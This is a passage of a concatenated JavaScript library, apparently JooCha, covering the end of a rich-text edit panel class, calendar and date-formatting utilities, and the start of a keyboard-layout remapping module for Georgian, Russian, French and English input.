	local.AddButtonEx(vName,{content:cont,attribute:attr,event:{click:func},TagFilter:tagflts,mode:vMode});
}
//------------------------------------------------------------------
this.allowDrop=function allowDrop(ev) {
    ev.preventDefault();
}
//------------------------------------------------------------------
this.drag=function drag(ev) {
    ev.dataTransfer.setData("text", ev.target.id);
}
//------------------------------------------------------------------
this.drop=function drop(ev) {
    ev.preventDefault();
    var data = ev.dataTransfer.getData("text");
    ev.target.appendChild(document.getElementById(data));
}
//-------------------------------------------------------------
this.storeCurrentSelection=function storeCurrentSelection (objframe,objdoc)
{
  if (objframe.getSelection)
  {
    var selection = objframe.getSelection();
    if (selection.rangeCount > 0)
    {
       var selectedRange = selection.getRangeAt(0);
       return selectedRange.cloneRange();
    }
    else return null;
  }
  else if (objdoc.selection) 
  {
    var selection = objdoc.selection;
    //if (selection.type.toLowerCase() == 'text') 
    {
      return selection.createRange().getBookmark();
    }
    //else return null;
  }
  else return null;
}
//-------------------------------------------------------------
this.restoreSelection=function restoreSelection (objframe,objdoc,storedSelection) 
{
  if (storedSelection)
  {
       if (objframe.getSelection)
       {
         var selection = objframe.getSelection();
         selection.removeAllRanges();
         selection.addRange(storedSelection);
       }
       else if (objdoc.selection && objdoc.body.createTextRange)
       {
         var range = objdoc.body.createTextRange();
         range.moveToBookmark(storedSelection);
         range.select();
       }
  }
}
//-------------------------------------------------------------
//-------------------------------------------------------------
	//Public static functions
	this.xGet=function xGet(nm)
	{
		if(nm in GlobalEditPanelFindIdArray)return GlobalEditPanelFindIdArray[nm];
		
		for(var i=GlobalEditPanelArray.length-1;i>=0;i--)
		if(GlobalEditPanelArray[i].name==nm)return GlobalEditPanelArray[i];
		return null;
	}
//-------------------------------------------------------------
if(vTextAreaId)return this.init(vTextAreaId);	
return this;

}//end class
//-----------------========================--------------------------
//-----------------========================--------------------------
//-----------------========================--------------------------
function EditPanelSync()
{
	for(var i=0;i<GlobalEditPanelArray.length;i++)
	{
		try{
		GlobalEditPanelArray[i].sync();
		}catch(e)
		{
			console.log("EditPanelSync: "+i+"; "+e);
		}
	}
	try{
		EPRepairForSubmit();
	}catch(e){
		console.log("EditPanelSync=>EPRepairForSubmit "+e);
	}
	
}
//-----------------========================--------------------------
function EditPanelReset()
{
	for(var i=0;i<GlobalEditPanelArray.length;i++)
	{
		try{
		GlobalEditPanelArray[i].reset();
		}catch(e)
		{
			console.log("EditPanelSync: "+i+"; "+e);
		}
	}
}

//--------------------------------------------------------
function InitializeEditPanelEx(className)
{
	var objs=null;
	
	if(className){
		if(typeof className=="object"){objs=new Array();objs[0]=className;}
		else objs=document.getElementsByClassName(className);
	}
	else objs=document.getElementsByTagName('textarea');
	
	var ars=new Array();
	for(var i=objs.length-1;i>=0;i--)
	{
		ars[i]=objs[i];
		if(ars[i].getAttribute("data-for-editpanel")!=true)var pan=new EditPanel(ars[i]);
	}

}
//--------------------------------------------------------
function InitializeEditPanel(className)
{
if(className)setTimeout("InitializeEditPanelEx(\""+className+"\")",100);
else setTimeout("InitializeEditPanelEx()",100);
}
//--------------------------------------------------------
function GetEditPanelObjectById(vId)
{
	return new EditPanel().xGet(vId);
}
//--------------------------------------------------------
/*Repairing - old verions - not active, now is removing process */
function EPRepairForSubmit(){
//gagrdzeleba JS-it encoding shemogeba
	var els=document.querySelectorAll("textarea[data-coding-encoder]");
	if(els && els.length>0)
	for(var i=0;i<els.length;i++){
		var loc=(new EditPanel()).xGet(els[i].name);
		if(loc){
			if((loc.ContentEncode.toLowerCase()=="jsonx")){
				els[i].value="JSONX"+encodeURIComponent(JSON.stringify({"data":loc.value()}));
			}else
			if((loc.ContentEncode.toLowerCase()=="jmixx")){
				els[i].value="JMIXX"+btoa(encodeURIComponent(loc.value()));
			}
		}
	}
};

function EditPanelValueDecoder(str){
	if(str.substr(0,5).toLowerCase()=="jmixx"){
		return decodeURIComponent(atob(str.substr(5)));
	}else
	if(str.substr(0,5).toLowerCase()=="jsonx"){
		return JSON.parse(decodeURIComponent(str.substr(5)));
	}
	return str;
}

AddEventOnObject(window,"load",function(){
	var els=document.querySelectorAll("[data-coding-encoder]");//textarea
		if(els && els.length>0)
	for(var i=0;i<els.length;i++){
		var adn=document.querySelectorAll("input["+els[i].name+"_coding_encoding]");
		if(adn && adn.length>0){
			adn.value=els[i].getAttribute("data-coding-encoder");
		}else{
			adn=document.createElement("INPUT");
			adn.type="hidden";
			adn.name=els[i].name+"_coding_encoding";
			adn.value=els[i].getAttribute("data-coding-encoder");
			var par=els[i].parentElement || els[i].parentNode;
			par.insertBefore(adn,els[i]);
		}
	}
});

/* jc_date.js */

/**
 * js_date - JavaScript JooCha Library
 *
 * JS library that use for calendar, date and time
 *
 * @link    http://joocha.com
 * @license For open source use: GPLv3
 *          For commercial use: Commercial License
 * @author  John Chavchanidze
 * @version 1.0.2
 *
 * See usage examples at http://joocha.com/examples
 */
//-----------------------------------------------------------
var   msecondsPerMinute = 1000 * 60;
var   msecondsPerHour = msecondsPerMinute * 60;
var   msecondsPerDay = msecondsPerHour * 24;
var CalendarClassName="";
var CCNameEx="_Class";


function YearlyArray(){
    this.YearlyDayStatus=new Array();
	this.Date=new Date();
	this.Year=this.Date.getFullYear();
	
    for(var ttt=1;ttt<=12;ttt++)
    {
       this.YearlyDayStatus[ttt]=new Array();
       for(var kkk=1;kkk<=31;kkk++)
       {
          this.YearlyDayStatus[ttt][kkk]=new Array();
       }
    }
	
/*this.YearlyDayStatus[1][1][0]="red";
this.YearlyDayStatus[1][31][0]="red";
this.YearlyDayStatus[1][8][0]="red";
this.YearlyDayStatus[1][15][0]="red";
this.YearlyDayStatus[6][25][0]="half_red";
this.YearlyDayStatus[7][26][0]="red_green";
this.YearlyDayStatus[8][25][0]="all";
this.YearlyDayStatus[9][12][0]="";
this.YearlyDayStatus[9][12][1]="border:1px solid #88ff88;";
	*/
	
	this.setYear=function setYear(yr)
	{
	   this.Year==yr;
	   this.Date.setFullYear(yr);
	}
	
	
	this.setEveryWeek=function setEveryWeek(wk,val)
	{
	   if(!wk)wk=0;
	   if(!val)val="red";
       for(var ttt=1;ttt<=12;ttt++)
       {
          for(var kkk=1;kkk<=31;kkk++)
          {
		      var dt=new Date(this.Year,ttt-1,kkk);
		      if(dt.getDay()==wk)
              this.YearlyDayStatus[ttt][kkk][0]=val;
          }
       }
   }
   
	this.clear=function clear()
	{
       for(var ttt=1;ttt<=12;ttt++)
       {
          for(var kkk=1;kkk<=31;kkk++)
          {
		      for(var hhh=0;hhh<this.YearlyDayStatus[ttt][kkk].length;hhh++)
                  this.YearlyDayStatus[ttt][kkk][hhh]="";
          }
       }
	}
   
	
	
	
	this.setPoint=function setPoint(month,day,val)
	{
	    if(!val)val="red";
        this.YearlyDayStatus[month][day][0]=val;
	}
	
	
	this.Array=function Array()
	{
	    return this.YearlyDayStatus;
	}
}

var YearlyArr=new YearlyArray();
//YearlyArr.setEveryWeek();
//YearlyArr.setEveryWeek(6,"yell");
var YearlyDayStatus=YearlyArr.Array();

//-----------------------------------------------------------
function DateSplit(dt)
{
var arrdt=new Array();
var arrcnt=0;
arrdt[arrcnt]="";

  for(var i=0;i<dt.length;i++)
  {
     if((dt.charAt(i)>='0')&&(dt.charAt(i)<='9')||
        (dt.charAt(i)>='a')&&(dt.charAt(i)<='z')||
        (dt.charAt(i)>='A')&&(dt.charAt(i)<='Z'))
     {
        arrdt[arrcnt]+=dt.charAt(i);
     }
     else
     if(arrdt[arrcnt].length>0)
     {
        arrcnt++;
        arrdt[arrcnt]="";
     };
  };
return arrdt;
}
//----------------------------------------------------------------------
function DateByFormat(dt,fmt)
{
var hour=0;
var minute=0;
var second=0;
var month=0;
var day=0;
var year=0;
var arrfmt=DateSplit(fmt);
var arrdt=DateSplit(dt);
var lnfmt=arrfmt.length;
var ln=arrdt.length;
if(ln>lnfmt)ln=lnfmt;
   for(var i=0;i<ln;i++)
   {
        if((arrfmt[i]=='D')||(arrfmt[i]=='d'))
	day=arrdt[i];
        else
        if((arrfmt[i]=='M')||(arrfmt[i]=='m'))
	month=arrdt[i];
        else
        if((arrfmt[i]=='y')||(arrfmt[i]=='Y'))
	year=arrdt[i];
        else
        if((arrfmt[i]=='h')||(arrfmt[i]=='H'))
	hour=arrdt[i];
        else
        if(arrfmt[i]=='i')
	minute=arrdt[i];
        else
        if(arrfmt[i]=='s')
	second=arrdt[i];
   }
month--;
var locdt=new Date(parseInt(year),parseInt(month),parseInt(day),parseInt(hour),parseInt(minute),parseInt(second));
return locdt;
}
//----------------------------------------------------------------------
function DateToDateEx(locdt,fmt2)
{
fmt2=fmt2.replace('d',locdt.getDate());
fmt2=fmt2.replace('D',locdt.getDate());
fmt2=fmt2.replace('y',locdt.getFullYear());
fmt2=fmt2.replace('Y',locdt.getFullYear());
fmt2=fmt2.replace('m',locdt.getMonth()+1);
fmt2=fmt2.replace('M',locdt.getMonth()+1);
fmt2=fmt2.replace('h',locdt.getHours());
fmt2=fmt2.replace('H',locdt.getHours());
fmt2=fmt2.replace('i',locdt.getMinutes());
fmt2=fmt2.replace('s',locdt.getSeconds());
fmt2=fmt2.replace('w',getGeoDay(locdt));
fmt2=fmt2.replace('W',getGeoDay(locdt));


return fmt2;
}

//----------------------------------------------------------------------
function DateToDate(dt,fmt,fmt2)
{
var locdt=DateByFormat(dt,fmt);
fmt2=DateToDateEx(locdt,fmt2);
return fmt2;
}

//----------------------------------------------------------------------
function getGeoDay(d)
{
   if(d.getDay()==0)return 7;
   return d.getDay();
}
//----------------------------------------------------------------------
function GetDateString(year,month,day)
{
month++;
var fmt2=ProjectDateFormat;
fmt2=fmt2.replace('d',day);
fmt2=fmt2.replace('D',day);
fmt2=fmt2.replace('y',year);
fmt2=fmt2.replace('Y',year);
fmt2=fmt2.replace('m',month);
fmt2=fmt2.replace('M',month);
   return fmt2;
}
//----------------------------------------------------------------------
function GetDateTimeString(year,month,day,hour,minut,second)
{
month++;
var fmt2=ProjectDateTimeFormat;
fmt2=fmt2.replace('d',day);
fmt2=fmt2.replace('D',day);
fmt2=fmt2.replace('y',year);
fmt2=fmt2.replace('Y',year);
fmt2=fmt2.replace('m',month);
fmt2=fmt2.replace('M',month);

fmt2=fmt2.replace('h',hour);
fmt2=fmt2.replace('H',hour);
fmt2=fmt2.replace('i',minut);
fmt2=fmt2.replace('I',minut);
fmt2=fmt2.replace('s',second);
fmt2=fmt2.replace('S',second);

   return fmt2;
}

//----------------------------------------------------------------------
function SubDateExMlsec(d1,d2)
{
if(!(d1 && d1.getTime))d1=DateByFormat(d1,ProjectDateFormat);
if(!(d2 && d2.getTime))d2=DateByFormat(d2,ProjectDateFormat);

var ret=Math.floor((d1.getTime()-d2.getTime()));
return ret;
}
//----------------------------------------------------------------------
function SubDateExSec(d1,d2)
{
var ret=Math.floor(SubDateExMlsec(d1,d2)/1000);
return ret;
}
//----------------------------------------------------------------------
function SubDateExMinut(d1,d2)
{
var ret=Math.floor(SubDateExMlsec(d1,d2)/(1000*60));
return ret;
}
//----------------------------------------------------------------------
function SubDateExHour(d1,d2)
{
var ret=Math.floor(SubDateExMlsec(d1,d2)/(1000*60*60));
return ret;
}

//----------------------------------------------------------------------
function SubTimeExMlsec(d1,d2)
{
if(!(d1 && d1.getTime))d1=DateByFormat(d1,ProjectDateTimeFormat);
if(!(d2 && d2.getTime))d2=DateByFormat(d2,ProjectDateTimeFormat);

var ret=Math.floor((d1.getTime()-d2.getTime()));
return ret;
}
//----------------------------------------------------------------------
function SubTimeExSec(d1,d2)
{
var ret=Math.floor(SubTimeExMlsec(d1,d2)/1000);
return ret;
}
//----------------------------------------------------------------------
function SubTimeExMinut(d1,d2)
{
var ret=Math.floor(SubTimeExMlsec(d1,d2)/(1000*60));
return ret;
}
//----------------------------------------------------------------------
function SubTimeExHour(d1,d2)
{
var ret=Math.floor(SubTimeExMlsec(d1,d2)/(1000*60*60));
return ret;
}

//----------------------------------------------------------------------
function GetDayInInterval(d1,d2)
{
msecondsPerMinute = 1000 * 60;
msecondsPerHour = msecondsPerMinute * 60;
msecondsPerDay = msecondsPerHour * 24;

var ret=Math.floor((d1.getTime()-d2.getTime())/msecondsPerDay);
return ret;
}
//----------------------------------------------------------------------
function SubDate(dt1,dt2)
{
var d1=DateByFormat(dt1,ProjectDateFormat);
var d2=DateByFormat(dt2,ProjectDateFormat);
return Math.abs(GetDayInInterval(d1,d2));
}
//----------------------------------------------------------------------
function cal_onchangedate(calnm,lpar,winpar,dsel,msel,ysel,yds)
{
var inhtm="";
var month=msel;
var year=ysel;
var objmonth;
var objyear;
var winfnc="";
var onclkV;
var bg1;
var bgtest;

if(winpar)
if(winpar.length)
{
   winfnc="winclose('"+winpar+"');";
}

if(objmonth=document.getElementById(calnm+"_selmonth"))
{
    month=objmonth.options[objmonth.selectedIndex].value;
}

if(objyear=document.getElementById(calnm+"_selyear2"))
{
    year=objyear.value;
}

month--;
var d,i,curd;
var wd='25px';
   d = new Date();
   d.setFullYear(year,month,1);

   curd = new Date();

inhtm+="<table id='"+calnm+"_outer' class='"+CCNameEx+"_DayTable' style='width:100%;height:140px;border:0;padding:1px;margin:0; font-size:11px;font-family:verdana;border-color:#888;background-color:#fff;'>";
inhtm+="<tr  class='"+CCNameEx+"_DayHeaderTR' style='background-color:#96aebe;color:#FFFFFF;font-weight:700;text-align:center;'>";
for(var t=0;t<7;t++)inhtm+="<td style='width:"+wd+"'  class='"+CCNameEx+"_DayHeaderTD'>"+WeekDayStrForDate[t]+"</td>";
inhtm+="</tr>";

   inhtm+="<tr  style='background-color:#f5f5ff;color:#365082;font-weight:300;text-align:center;'  class='"+CCNameEx+"_DayInactiveTR'>";
   for(i=1;i<getGeoDay(d);i++)inhtm+="<td class='"+CCNameEx+"_DayInactiveTD'>&nbsp;</td>";

var bll=0;
for(i=1;i<33;i++)
{
  d.setFullYear(year,month,i);
  if(d.getMonth()!=month)break;

   if(bll==7)
   {
      inhtm+="</tr>\n<tr style='color:#365082;font-weight:300;text-align:center;'  class='"+CCNameEx+"_DayTR' >";
   }
   
   bg1="";
   bgtest=i;
   thint="";

   if(yds)
   if(yds[month+1])
   if(yds[month+1][i])
   if(yds[month+1][i].length)
   {
      if(yds[month+1][i][0])
      {
          bg1="background:transparent URL("+WebLinkTheme+"colors/"+yds[month+1][i][0]+".gif) repeat";
      }else
	  if(yds[month+1][i][1])
	  {
	      bg1=yds[month+1][i][1];
	  }
	  
      if(yds[month+1][i][2])
	  {
	     thint=" title=\""+yds[month+1][i][2]+"\" ";
	  }
	  
   }

  bll=getGeoDay(d);
  onclkV="calendar_set_changes(this,'"+calnm+"','"+lpar+"');"+winfnc+";";
  onclkSel="calendar_clear_selected(this);addClass(this,'selected')";
  if(i==dsel)
  inhtm+="<td  class='"+CCNameEx+"_DaySelectedTD selected' "+thint+" onclick=\""+onclkSel+";\" ondblclick=\""+onclkV+";\" style='"+bg1+";cursor:pointer;font-weight:700;border-width:1px;border-style:solid;border-color:#00FF00'>"+bgtest+"</td>";
  else
  if((i==curd.getDate())&&(month==curd.getMonth())&&(year==curd.getFullYear()))
  inhtm+="<td  class='"+CCNameEx+"_DayCurrentTD' "+thint+" onclick=\""+onclkSel+";\" ondblclick=\""+onclkV+";\" style='"+bg1+";cursor:pointer;font-weight:700;border-width:1px;border-style:solid;border-color:#FF0000'>"+bgtest+"</td>";
  else
  inhtm+="<td  class='"+CCNameEx+"_DayTD' "+thint+" onclick=\""+onclkSel+";\" ondblclick=\""+onclkV+";\"  style='"+bg1+";cursor:pointer;border-width:1px;'>"+bgtest+"</td>";
}

   if((bll<7)&&(bll>0))
   for(i=bll;i<7;i++)
   {
        inhtm+="<td bgcolor='#f5f5ff'  class='"+CCNameEx+"_DayInactiveTD'>&nbsp;</td>";
   };
  inhtm+="</tr>\n</table>";
return inhtm;
}
//----------------------------------------------------------------------
function calendar_clear_selected(obj){
	var pnt=obj,imax=4;
	while(pnt.tagName.toLowerCase()!='table'){
		pnt=pnt.parentElement || pnt.parentNode;
		imax--;
		if(imax<=0)break;
	}
	if(pnt && pnt.tagName.toLowerCase()=='table'){
		//var els=pnt.getElementsByTagName('td');
		 var els=pnt.getElementsByClassName('selected');
		for(var i=0;i<els.length;i++){
			delClass(els[i],'selected');
		}
		
	}
	
}
//----------------------------------------------------------------------
function calendar_set_changes(obj,calnm,lpar){
	var pnt=obj,imax=4;
	while(pnt.tagName.toLowerCase()!='table'){
		pnt=pnt.parentElement || pnt.parentNode;
		imax--;
		if(imax<=0)break;
	}
	var NewDay=0;
	if(pnt && pnt.tagName.toLowerCase()=='table'){
		//var els=pnt.getElementsByTagName('td');
		 var els=pnt.getElementsByClassName('selected');
		 if(els && els.length>0)NewDay=els[0];
	}
	if(NewDay){
		var vtime=GetTimeFromInputZone(calnm);
		if(vtime.hastime)
			document.getElementById(lpar).value=GetDateTimeString(vtime.year,vtime.month,NewDay.innerHTML,vtime.hour,vtime.minute,vtime.second);
		else
			document.getElementById(lpar).value=GetDateString(vtime.year,vtime.month,NewDay.innerHTML);
			
		if(document.getElementById(lpar).onchange)document.getElementById(lpar).onchange();
	}
	
}

//----------------------------------------------------------------------
function yearly_onchangedate(calnm,lpar,winpar,ysel,yds)
{
 var htm="";
		 htm+="<ul>";
for(var im=1;im<=12;im++)
         htm+="<li>"+MonthNamesForDate[im-1]+"<br>"+cal_onchangedate(calnm,lpar,winpar,0,im,ysel,yds)+"</li>";
		 htm+="</ul><div style=\"clear:both;\"> </div>";		 
return htm;
}
//----------------------------------------------------------------------

function GetYearlyCalendarHTML(wparam,lparam,winclickpar,cls,yds,ydsname)
{
  var d;
  var dd,m,y;
  d=new Date();
  if(!wparam)wparam="";  
  if(!lparam)lparam="";
  if(!winclickpar)winclickpar="";
  if(!cls)cls="";  
  
  if(lparam)
  if(document.getElementById(lparam))
  if(document.getElementById(lparam).value)
       d=DateByFormat(document.getElementById(lparam).value,ProjectDateFormat);

 CCNameEx="CalendarClass";
 if(cls)CCNameEx+=cls;
 if(CalendarClassName)CNameEx+=CalendarClassName;

  y=d.getFullYear();m=(d.getMonth()+1);dd=d.getDate();
  var cal_name="jcyearly_"+lparam;
  if(cal_name.length==0)cal_name="jcyearly_";  


var htm="<div class='yearlycalendar"+cls+"'><span>"+wparam+"</span>";
         htm+="<div class='select-editable' style='width:75px;'><SELECT SIZE='1' onchange=\"this.nextElementSibling.value=this.value;document.getElementById('"+cal_name+"').innerHTML=yearly_onchangedate('"+cal_name+"','"+lparam+"','"+winclickpar+"','"+y+"',"+ydsname+")\"  id='"+cal_name+"_selyear' >";
		 var defi=y;  
         for(var i=y-50;i<y+50;i++)
                 if(i==y){htm+="<option value='"+i+"' selected='selected'>"+i+"</option>";defi=i;}
         else htm+="<option value='"+i+"' >"+i+"</option>";
         htm+="</SELECT><input id='"+cal_name+"_selyear2' type='text' autocomplete='off' value='"+defi+"' onchange=\"setSelectValue(document.getElementById('"+cal_name+"_selyear'),this.value,true);document.getElementById('"+cal_name+"').innerHTML=yearly_onchangedate('"+cal_name+"','"+lparam+"','"+winclickpar+"','"+y+"',"+ydsname+")\"></div><hr>";
		 htm+="<div id=\""+cal_name+"\">"+yearly_onchangedate(cal_name,lparam,winclickpar,y,yds)+"</div>";
         htm+="</div>";
return htm;

}
//----------------------------------------------------------------------
function GetTimeFromInputZone(cal_name){
	var vtime={year:0,month:0,day:0,hour:0,minute:0,second:0,time:[0,0,0]};
	var objtime,objmonth,objyear;
	if(objtime=document.getElementById(cal_name+"_time"))
	{
		vtime.time=objtime.value.split(":");
		vtime.hour=(vtime.time[0] && vtime.time[0]!=undefined?vtime.time[0]:0);
		vtime.minute=(vtime.time[1] && vtime.time[1]!=undefined?vtime.time[1]:0);
		vtime.second=(vtime.time[2] && vtime.time[2]!=undefined?vtime.time[2]:0);
		vtime.hastime=true;
		if(vtime.time[0]==undefined || vtime.time[1]==undefined)vtime.hastime=false;
	}
	
	if(objmonth=document.getElementById(cal_name+"_selmonth"))
	{
		vtime.month=parseInt(objmonth.options[objmonth.selectedIndex].value)-1;
	}

	if(objyear=document.getElementById(cal_name+"_selyear2"))
	{
		vtime.year=objyear.value;
	}
	

	return vtime;
}
//----------------------------------------------------------------------
function GetCalendarHTML(wparam,lparam,winclickpar,cls)//wparam - calendar window name & CWName+'Class_'+cls, lparam - .value object id, winclickpar - border window calendar
{
  var d;
  var dd,m,y,vH,vM,vS;
  d=new Date();
  if(document.getElementById(lparam))
  if(document.getElementById(lparam).value)
       d=DateByFormat(document.getElementById(lparam).value,ProjectDateTimeFormat);
	   
	   

 CCNameEx="CalendarClass";
 if(cls)CCNameEx+=cls;
 if(CalendarClassName)CNameEx+=CalendarClassName;

  y=d.getFullYear();m=(d.getMonth()+1);dd=d.getDate();
  vH=d.getHours();vM=d.getMinutes();vS=d.getSeconds();
  var cal_name="jccal_"+lparam;
  if(cal_name.length==0)cal_name="jccalendar";

var htm="<table id='"+cal_name+"' cellpadding=0 cellspacing=0 border=0><tr><td valign=top>";
htm+="<TABLE bgcolor=#dddddd cellpadding=1 cellspacing=1  class='"+CCNameEx+"_MainTable'>";
htm+="<TR><TD align=center>";
htm+="	<table border=0 cellpadding=0 cellspacing=0><tr><td>";
htm+="                   <SELECT SIZE='1' class='"+CCNameEx+"_MonthSelect' onchange=\"document.getElementById('"+cal_name+"_inner').innerHTML=cal_onchangedate('"+cal_name+"','"+lparam+"','"+winclickpar+"','"+dd+"','"+m+"','"+y+"');\" id='"+cal_name+"_selmonth'  style='width:124px'>";

          for(var i=1;i<=12;i++)
                 if(i==m)htm+="<option value='"+i+"' selected='selected'>"+MonthNamesForDate[i-1]+"</option>";
          else htm+="<option value='"+i+"' >"+MonthNamesForDate[i-1]+"</option>";
          htm+="</SELECT></td>";

         htm+="<td><div class='select-editable' style='width:75px;'><SELECT SIZE='1' class='"+CCNameEx+"_YearSelect' onchange=\"this.nextElementSibling.value=this.value;document.getElementById('"+cal_name+"_inner').innerHTML=cal_onchangedate('"+cal_name+"','"+lparam+"','"+winclickpar+"','"+dd+"','"+m+"','"+y+"')\"  id='"+cal_name+"_selyear' >";
		 var defi=2016;
         for(var i=y-60;i<y+60;i++)
                 if(i==y){htm+="<option value='"+i+"' selected='selected'>"+i+"</option>";defi=i;}
         else htm+="<option value='"+i+"' >"+i+"</option>";
         htm+="</SELECT><input id='"+cal_name+"_selyear2' type='text' autocomplete='off' value='"+defi+"' onchange=\"setSelectValue(document.getElementById('"+cal_name+"_selyear'),this.value,true);document.getElementById('"+cal_name+"_inner').innerHTML=cal_onchangedate('"+cal_name+"','"+lparam+"','"+winclickpar+"','"+dd+"','"+m+"','"+y+"')\"></div></td></tr></table>";

         htm+="</TD></TR>";
         htm+="<TR><TD id='"+cal_name+"_inner'>";
         htm+=cal_onchangedate(cal_name,lparam,winclickpar,dd,m,y);
         htm+="</TD></TR>";
         htm+="</TABLE>";
		 htm+="<input id='"+cal_name+"_time' placeholder='00:00:00 / HH:MM:SS, Hour, Minute, Second' style='text-align:center;margin:3px 15px;width:calc(100% - 30px);' value='"+(vH?vH+":"+vM+":"+vS:"")+"'/>";
		 htm+="</td></tr>";

var winfnc="";
if(winclickpar)
if(winclickpar.length)
{
   winfnc="winclose('"+winclickpar+"');";
}
 var cud=new Date();		 
  var onclkV="calendar_set_changes(this,'"+cal_name+"','"+lparam+"');"+winfnc+";";
  var onclkA="document.getElementById('"+lparam+"').value=GetDateTimeString('"+cud.getFullYear()+"','"+cud.getMonth()+"','"+cud.getDate()+"','"+cud.getHours()+"','"+cud.getMinutes()+"','"+cud.getSeconds()+"');if(document.getElementById('"+lparam+"').onchange)document.getElementById('"+lparam+"').onchange();"+winfnc+";";		   
		 htm+="<tr><td align=\"center\">";
		 htm+="<span class=\"cal_this\" onclick=\""+onclkV+";\" style=\"cursor:pointer;font-size:11px;font-family:verdana;border-color:#888888;padding:3px 10px;margin:0px 7px;border:1px solid #AAA;border-radius:3px;\">Set Manual</span>";
		 htm+="<span class=\"cal_today\" onclick=\""+onclkA+";\" style=\"cursor:pointer;font-size:11px;font-family:verdana;border-color:#888888;padding:3px 5px;margin:0px 7px;border:1px solid #AAA;border-radius:3px;\">Set Live</span>";
 		 
         htm+="</td></tr></table>";
return htm;
}
//----------------------------------------------------------------------
         var CalendarWinName="Calendar";
         var derniercalendarEx='';
         function OpenCalendar(nm,lparam)
         {
               GLOBWINDOWNAME=CalendarWinName;
               winclose(derniercalendarEx);
               WinSetZoom('252px','295px');
	       AlphaMainWin(0.5);
               var wino=CreateHTMLWindow();
               if(document.getElementById(wino))
               {
                    derniercalendarEx=wino;
                    document.getElementById(wino+'_ca').innerHTML="<div style='width:100%;height:100%;border:1px solid black;background:white;'>"+GetCalendarHTML(GLOBWINDOWNAME,lparam,wino)+"</div>";
               }else AlphaMainWin(1);
         }
//----------------------------------------------------------------------
function OpenYearlyWin(name,src)
{
        GLOBWINDOWNAME=name;
        WinParamSetDefault();
        WinSetZoom('1200px','500px');				
 	    WinSetCenter();

        winclose(winoneobj);
        AlphaMainWin(0.5);
        winoneobj=CreateHTMLWindow();
        var obj=document.getElementById(winoneobj+'_ca');
        obj.innerHTML="<div style='position:relative;overflow:hidden;width:100%;height:100%;margin:0;padding:0;border:0;'><div id='"+winoneobj+"_frid' class='Scroller-Container'  style='position:absolute;width:100%;height:100%;margin:0;padding:0;border:0;overflow:hidden;'></div></div><iframe id='"+winoneobj+"_frid2' src=\""+src+"\"  onload=\"FrameToDiv('"+winoneobj+"_frid2','"+winoneobj+"_frid');setupScrollbar('"+winoneobj+"_frid','"+winoneobj+"_Scrolldiv',1);\" style='position:absolute;visibility:hidden;width:0;height:0;margin:0;padding:0;border:0;overflow:auto;'></iframe>";
        obj.style.overflow='hidden';
		

}
//----------------------------------------------------------------------
         function OpenCalendarEx(lparam)
         {
              OpenCalendar(CalendarWinName,lparam);
         }
//----------------------------------------------------------------------
var TimeTimerObj;
function TimeTimerProc()
{
var now = new Date();
var hour = now.getHours();

var minute = now.getMinutes();

var second = now.getSeconds();
document.getElementById(TimeTimerObj).innerHTML=hour+":"+minute+":"+second;
}
//----------------------------------------------------------------------
function StartTimeInner(obj)
{
TimeTimerObj=obj;
TimeTimerProc();
setInterval("TimeTimerProc()",1000);
}
//----------------------------------------------------------------------
//----------------------------------------------------------------------


/* jc_key.js */

var gTest=5;
var KEYCODE_GEO="ქწერტყუიოპ[]ასდფგჰჯკლ;'ზხცვბნმ,./QჭEღთYUIOP{}AშDFGHჟKL:\"ძXჩVBNM<>?`1234567890-=\\~!@#$%^&*()_+|";
var KEYCODE_RUS="йцукенгшщзхъфывапролджэячсмитьбю.ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ,`1234567890-=\\~!@#$%^&*()_+|";
var KEYCODE_ENG="qwertyuiop[]asdfghjkl;'zxcvbnm,./QWERTYUIOP{}ASDFGHJKL:\"ZXCVBNM<>?`1234567890-=\\~!@#$%^&*()_+|";
var KEYCODE_FRC="azertyuiop^$qsdfghjklmùwxcvbn,;:!AZERTYUIOP\¨£WXCVBN?./§²&é\"'(-è_çà)=*1234567890°+µ";
var CUR_KEYCODE=KEYCODE_ENG;

function KC_SetENG(){CUR_KEYCODE=KEYCODE_ENG;};
function KC_SetGEO(){CUR_KEYCODE=KEYCODE_GEO;};
function KC_SetRUS(){CUR_KEYCODE=KEYCODE_RUS;};
function KC_SetFRC(){CUR_KEYCODE=KEYCODE_FRC;};

function KC_SetEnGe(cdc)
{
if(cdc)KC_SetGEO();
else KC_SetENG();
};

function KC_SetByCode(cdc)
{
switch(cdc)
{
case 1:
case "1":KC_SetGEO();break;
case 2:
case "2":KC_SetENG();break;
case 3:
case "3":KC_SetRUS();break;
case 4:
case "4":KC_SetFRC();break;
};
};

function KC_GetCode(cur)
{
for(var i=0;i<KEYCODE_ENG.length;i++)if(KEYCODE_ENG.charCodeAt(i)==cur)return CUR_KEYCODE.charCodeAt(i);
return cur;
};

function KC_GetChar(cur)
{
for(var i=0;i<KEYCODE_ENG.length;i++)if(KEYCODE_ENG.charAt(i)==cur)return CUR_KEYCODE.charAt(i);
return cur;
};

function KC_KeyPress(th)
{
window.event.keyCode=KC_GetCode(window.event.keyCode);
};


var KCS_MX_GEO=1000;
var KCS_MX_ENG=10000;
var KCS_MX_RUS=11000;

var GlobCodeVar=new Array(512);
function KCSetGCVN(i){for(;i<512;i++)GlobCodeVar=0;};

function KCS_GetElCode(i)
{
if(GlobCodeVar[i]>KCS_MX_RUS)return (GlobCodeVar[i]-KCS_MX_RUS);
else
if(GlobCodeVar[i]>KCS_MX_ENG)return (GlobCodeVar[i]-KCS_MX_ENG);
else
if(GlobCodeVar[i]>KCS_MX_GEO)return (GlobCodeVar[i]-KCS_MX_GEO);
};
function KCS_GetElChar(i){return  String.fromCharCode(KCS_GetElCode(i));};




function KC_KeyUp(th)
{
if(!EFF)
{
var bl=KCS_MX_GEO;
if(CUR_KEYCODE==KEYCODE_ENG)bl=KCS_MX_ENG;
if(CUR_KEYCODE==KEYCODE_RUS)bl=KCS_MX_RUS;

if(th.value.length==0)GlobCodeVar[0]=0;else
if(th.value.length==1){GlobCodeVar[0]=bl+KC_GetCode(th.value.charCodeAt(0));th.value=KC_GetChar(th.value.charAt(0));}else
{
var ret=""
for(var i=0;i<th.value.length;i++)
if(th.value.charCodeAt(i)<128)
{
	if(KCS_GetElCode(i)==th.value.charCodeAt(i))
	{
		ret+=th.value.charAt(i);
	}
	else
	{
		GlobCodeVar[i]=bl+KC_GetCode(th.value.charCodeAt(i));
		ret+=KC_GetChar(th.value.charAt(i));
	};
}
else
{
	ret+=th.value.charAt(i);
};
th.value=ret;
};
};
};

function KC_GetUnChar(cur)
{
